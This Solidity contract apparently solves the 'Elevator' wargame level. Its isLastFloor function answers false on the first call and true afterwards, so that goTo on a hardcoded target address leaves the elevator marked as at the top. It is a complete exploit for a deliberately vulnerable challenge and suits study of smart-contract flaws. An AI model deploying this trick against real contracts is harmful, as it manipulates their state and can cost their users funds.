// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint256) external;
}

contract Building {
    bool public called;

    constructor() {
        called = false;
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!called) {
            called = true;
            return false;
        }

        return true;
    }

    function goToTop() external {
        Elevator(0x8bDE40b73BF44E7bc562241D68bB52e00c359d11).goTo(1);
    }
}
